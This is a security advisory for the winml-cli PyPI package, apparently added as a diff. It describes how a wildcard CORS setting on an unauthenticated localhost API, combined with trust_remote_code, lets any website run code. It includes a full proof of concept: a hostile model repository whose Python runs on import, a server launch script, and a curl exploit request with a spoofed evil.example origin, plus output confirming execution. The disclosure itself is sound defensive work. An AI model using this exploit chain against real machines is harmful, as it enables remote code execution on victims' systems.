@@ -1,0 +1,80 @@
+PYSEC-2026-3944 PyPI/winml-cli — Windows ML CLI: CORS misconfig enables localhost RCE
+package: winml-cli
+ecosystem: PyPI
+versions affected:
+  >= 0, < 0.4.0 (ECOSYSTEM)
+aliases: CVE-2026-84452, GHSA-96p9-rh4f-92cf
+references:
+  https://github.com/microsoft/winml-cli/security/advisories/GHSA-96p9-rh4f-92cf
+  https://nvd.nist.gov/vuln/detail/CVE-2026-84452
+  https://github.com/microsoft/winml-cli/pull/1321
+  https://github.com/microsoft/winml-cli/commit/f4073e0ef4700a25b623487e7e45c421ca0b9993
+  https://github.com/microsoft/winml-cli
+  https://pypi.org/project/winml-cli
+  https://github.com/advisories/GHSA-96p9-rh4f-92cf
+
+Case Description:
+
+MSRC Notes: Attachments: 1 file(s) attached (1 mp4) Summary: The vulnerability lies in the 'serve/cli_api.py' component of the 'winml-cli' project, which exposes all winml CLI commands over HTTP without authentication. Although it binds to localhost by default, it sets 'allow_origins' to a wildcard, allowing any website to interact with the endpoint. This, combined with the '--trust-remote-code' flag in 'build' and 'config' commands, enables an attacker to execute arbitrary code by hosting a malicious model repository. The root cause is the lack of proper authentication and validation of the 'trust_remote_code' parameter, leading to Remote Code Execution (RCE).
+
+Finder Description: WARNING: Original content contained invalid characters. Please see original submission in the event that the characters removed are relevant for the PoC.
+
+serve/cli_api.py exposes every winml CLI command over HTTP with no authentication. That's defensible on its own - it binds 127.0.0.1 by default, so the audience is this machine. But it also sets allow_origins=["*"] (cli_api.py:150, duplicated at app.py:219), and the victim's browser is a local process: the wildcard lets any website call the endpoint and read the reply, erasing the boundary the loopback bind draws.
+
+build and config both accept --trust-remote-code, and a JSON true becomes that flag unfiltered. An attacker-named model repo reaches AutoConfig.from_pretrained(..., trust_remote_code=True) (_autoconfig.py:191), where transformers imports Python from that repo - RCE as the server user from any page the victim loads. The payload runs on import, so the command's exit_code: 1 is irrelevant.
+
+Reported Repro Steps:
+
+1. Setup
+
+git clone -q https://github.com/microsoft/winml-cli.git ~/winml-poc && cd ~/winml-poc &&  mkdir -p temp /tmp/poc/evil/pwn
+python3 -m pip install -q --target /tmp/poc/deps onnx onnxruntime transformers fastapi uvicorn click
+2. Hostile model repo (payload is module-level → runs on import)
+
+cat > /tmp/poc/evil/pwn/config.json <<'EOF'
+{"model_type":"pwn","auto_map":{"AutoConfig":"configuration_pwn.PwnConfig"}}
+EOF
+cat > /tmp/poc/evil/pwn/configuration_pwn.py <<'EOF'
+import getpass, os, socket, time
+from transformers import PretrainedConfig
+with open(os.environ["PWN_MARKER"], "w") as f:
+    f.write(f"ARBITRARY CODE EXECUTION\ntime={time.strftime('%F %T')}\n"
+            f"user={getpass.getuser()}\nhost={socket.gethostname()}\npid={os.getpid()}\n")
+class PwnConfig(PretrainedConfig):
+    model_type = "pwn"
+EOF
+3. Start server
+
+Windows: python -m uvicorn winml.modelkit.serve.cli_api:app --host 127.0.0.1 --port 8000
+
+Linux needs a stub for the Windows-only PDH module (no security relevance):
+
+cat > /tmp/poc/serve.py <<'EOF'
+import os, sys, types, uvicorn
+m = types.ModuleType("winml.modelkit.session.monitor._pdh")
+class PdhPoller:
+    def __init__(s,*a,**k): pass
+    def start(s,*a,**k): pass
+    def stop(s,*a,**k): pass
+    def poll(s,*a,**k): return {}
+    def sample(s,*a,**k): return {}
+    def close(s,*a,**k): pass
+m.PdhPoller = PdhPoller; m.PDH_AVAILABLE = False
+sys.modules["winml.modelkit.session.monitor._pdh"] = m
+from winml.modelkit.serve.cli_api import app
+uvicorn.run(app, host="127.0.0.1", port=8000, log_level="warning")
+EOF
+cd ~/winml-poc && PWN_MARKER=~/winml-poc/temp/PWNED PYTHONPATH=src:/tmp/poc/deps setsid nohup python3 /tmp/poc/serve.py >/tmp/poc/log 2>&1 </dev/null &
+sleep 8; until curl -sf -o /dev/null -m 1 http://127.0.0.1:8000/openapi.json; do sleep 1; done; echo up
+4. Exploit
+
+curl -s -D- -o /dev/null -X POST http://127.0.0.1:8000/v1/cli/build \
+ -H 'Origin: https://evil.example' -H 'Content-Type: application/json' \
+ -d '{"args":{"model":"/tmp/poc/evil/pwn","output_dir":"/tmp/poc/out","trust_remote_code":true}}' \
+ | grep -iE '^HTTP|^access-control-allow-origin'
+cat ~/winml-poc/temp/PWNED
+HTTP/1.1 200 OK
+access-control-allow-origin: *
+ARBITRARY CODE EXECUTION
+time=2026-08-17 11:24:35
+user=shrini  host=Shrinivasan  pid=11616
